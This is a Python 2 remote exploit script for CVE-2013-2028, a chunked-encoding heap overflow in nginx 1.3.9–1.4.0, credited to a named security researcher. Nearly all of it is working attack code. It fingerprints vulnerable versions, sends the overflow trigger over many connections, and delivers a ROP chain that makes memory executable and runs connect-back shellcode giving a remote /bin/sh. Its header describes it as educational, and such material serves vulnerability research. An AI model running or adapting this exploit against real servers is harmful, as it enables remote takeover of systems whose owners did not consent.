#!/usr/bin/env python
#
# Template for remote TCP exploit code, generated by PEDA
# nginx 1.3.9-1.4.0 chunked overflow heap based remote exploit - CVE-2013-2028
# Author: Long Le (longld at vnsecurity.net)
# Greetings to: w00d, suto, rd
#
# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
#
# How to run on localhost:
# terminal1 $ nc -v -l 16961
# terminal2 $ ./nginx_remote_exploit_x64.py localhost 80

import os
import sys
import struct
import resource
import time
import select
import re

def usage():
    print "Usage: %s host port" % sys.argv[0]
    return

def pattern(size=1024, start=0):
    try:
        bytes = open("pattern.txt").read(size+start)
        return bytes[start:]
    except:
        return "A"*size

def nops(size=1024):
    return "\x90"*size

def int2hexstr(num, intsize=4):
    if intsize == 8:
        if num < 0:
            result = struct.pack("<q", num)
        else:
            result = struct.pack("<Q", num)
    else:
        if num < 0:
            result = struct.pack("<l", num)
        else:
            result = struct.pack("<L", num)
    return result

i2hs = int2hexstr

def list2hexstr(intlist, intsize=4):
    result = ""
    for value in intlist:
        if isinstance(value, str):
            result += value
        else:
            result += int2hexstr(value, intsize)
    return result

l2hs = list2hexstr

from socket import *
import telnetlib
class TCPClient():
    def __init__(self, host, port, debug=0):
        self.debug = debug
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.sock.connect((host, port))

    def debug_log(self, size, data, cmd):
        if self.debug != 0:
            print "%s(%d): %s" % (cmd, size, repr(data))

    def send(self, data, delay=0):
        if delay:
            time.sleep(delay)
        nsend = 0
        while nsend < len(data):
            nsend = self.sock.send(data)
            if self.debug > 1:
                self.debug_log(nsend, data, "send")
            data = data[nsend:]
        return nsend

    def sendline(self, data, delay=0):
        nsend = self.send(data + "\n", delay)
        return nsend

    def recv(self, size=1024, delay=0):
        if delay:
            time.sleep(delay)
        buf = self.sock.recv(size)
        if self.debug > 0:
            self.debug_log(len(buf), buf, "recv")
        return buf

    def recv_until(self, delim):
        buf = ""
        while True:
            c = self.sock.recv(1)
            buf += c
            if delim in buf:
                break
        self.debug_log(len(buf), buf, "recv")
        return buf

    def recvline(self):
        buf = self.recv_until("\n")
        return buf

    def close(self):
        self.sock.close()

def check_version(host, port):
    s = TCPClient(host, port, debug=0)
    s.send("HEAD / HTTP/1.0\r\n\r\n")
    data = s.recv()
    m = re.search("Server: nginx/(1\.3\.9|1\.3\.1[0-6]|1\.4\.0)", data)
    if m:
        ver = m.group(1)
        return ver
    else:
        return None

def check_post(host, port, path="/"):
    s = TCPClient(host, port, debug=0)
    s.send("POST %s HTTP/1.0\r\n\r\n" % path)
    data = s.recv()
    m = re.search("Not Allowed", data)
    if m:
        return False
    else:
        return True

def http_header(method="POST", path="/"):
    headers = [
        "%s %s HTTP/1.1\r\n" % (method, path),
        "Host: 1337.vnsecurity.net:80\r\n",
        "Accept: */*\r\n",
        "Transfer-Encoding: chunked\r\n"
        "\r\n012"
    ]
    return "".join(headers)

def chunked_trigger():
    return "ffffffff" + "8ffff000" + "\r\n"*4

def stage1_shellcode():
    # change this to your desire shellcode
    # x86-64/linux/connect: 91 bytes
    # host=127.127.127.127 port=0x4241 cmd=/bin/sh
    shellcode = (
        "\x6a\x02\x5f\x6a\x01\x5e\x31\xd2\x6a\x29\x58\x0f\x05\x93\x31\xc0"
        "\x50\x66\x50\x66\x50\x68\x7f\x7f\x7f\x7f\x66\x68\x42\x41\x6a\x02"
        "\x58\x66\x50\x89\xdf\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
        "\x53\x5f\x31\xf6\x6a\x21\x58\x0f\x05\xff\xc6\x39\xfe\x75\xf5\x31"
        "\xd2\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe8\x08\x50"
        "\x48\x89\xe7\x48\x31\xf6\x6a\x3b\x58\x0f\x05"
    )
    return shellcode

def stub_shellcode():
    # memcopy [edi] -> [esp]
    shellcode = (
        "\x89\xe6"              # 0x00000000:    mov esi,esp
        "\x6a\x7f"              # 0x00000003:    push byte +0x7f
        "\x59"                  # 0x00000005:    pop rcx
        "\xf3\xa4"              # 0x00000007:    rep movsb
        "\x90"
    )
    return shellcode

def gen_rop_payload():
    isize = 8
    base = 0x400000
    xchg_esp_eax = base + 0x0002c058 # xchg esp, eax; ret
    addsp_48 = base + 0x037ad4 # add rsp,0x28; pop rbx; pop rbp; ret
    addsp_40 = base + 0x0002494f # add rsp, 0x20; pop rbx; ret
    ret = base + 0x000a5fd8
    popret = base + 0x00009f50 # pop rsi; ret
    pop_rdi = base + 0x000067ec # pop rdi; ret
    pop_rax = base + 0x0000cd80 # pop rax; ret
    pop_rsi = base + 0x00009f50 # pop rsi; ret
    pop_rdx = base + 0x0002b4ea # pop rdx; sbb dh, dh; ret
    pop_rbx = base + 0x00005d1f # pop rbx; ret
    add_rbx_rax = base + 0x00043a94 # add [rbx], rax; pop rbx; ret
    mov_rsi_rax = base + 0x0000b789 # mov [rsi], rax; pop r14; ret
    mmap64_plt = 0x404bd0
    mmap64_got = 0x6a77f8

    target = 0x6ba000 # data page

    payload = []
    for i in range(16000/isize/7):
        payload += [ret, ret, ret, ret, ret, popret, xchg_esp_eax]
    for i in range(16):
        payload += [ret]
    # mmap64@plt => mprotect: offset = 0x60
    payload += [pop_rbx, mmap64_got, pop_rax, 0x60, add_rbx_rax, ret]
    # mprotect(rwx)
    # rdi => target
    # rsi => 0x1000
    # rdx => 7
    payload += [pop_rdi, target, pop_rsi, 0x1000, pop_rdx, 0x7, mmap64_plt]
    # load stub code
    stub = stub_shellcode()
    payload += [pop_rsi, target, pop_rax, stub, mov_rsi_rax, -1]
    # execute stub code
    stage1 = stage1_shellcode()
    payload += [pop_rdi, target+len(stub), target, stage1]
    return list2hexstr(payload, isize)

def send_http(sock, delay, method="POST", path="/"):
    # send header
    sock.send(http_header(method, path))
    time.sleep(delay)
    # send trigger
    sock.send(chunked_trigger())
    time.sleep(delay)
    return

def exploit(host, port, method="POST", path="/"):
    port = int(port)
    nprocs = 32

    # check nginx version
    print "== nginx 1.3.9-1.4.0 remote exploit - CVE-2013-2028 =="
    print "== Target version: nginx-1.4.0-1.el6 =="
    print "[+] Checking nginx version..."
    t1 = time.time()
    ver = check_version(host, port)
    t2 = time.time()
    delay = t2-t1
    if ver is None:
        print "[-] Not supported, exiting..."
        sys.exit(1)

    print "> Remote nginx version: %s" % ver
    print "> Send/recv delay %s" % delay
    delay = min(delay, 0.5)

    # check POST support
    print "[+] Checking HTTP parameters..."
    post = check_post(host, port, path)
    if not post:
        print "[-] Not supported, try to re-launch with different path"
        sys.exit(1)
    else:
        print "> HTTP parameter is supported"

    # building exploit
    padding = "" # reserved
    print "[+] Connecting to server (%d connections)..." % nprocs
    client = TCPClient(host, port)
    client.sock.settimeout(60)
    socks = []
    for i in range(nprocs):
        socks += [TCPClient(host, port)]

    # send http and trigger
    print "[+] Sending HTTP headers..."
    for i in range(nprocs):
        send_http(socks[i], delay, method, path)

    # send ROP payload + stage1 shellcode
    print "[+] Sending payload, padding len=%d..." % len(padding)
    payload = padding
    payload += gen_rop_payload()
    time.sleep(1)
    for i in range(nprocs/2, nprocs):
        socks[i].sock.send(payload)
        time.sleep(0.1)

    for i in range(nprocs):
        socks[i].close()

    return True

if __name__ == "__main__":
    if len(sys.argv) < 3:
        usage()
    else:
        host = sys.argv[1]
        port = int(sys.argv[2])
        try:
            path = sys.argv[3]
        except:
            path = "/"
        exploit(host, port, path=path)
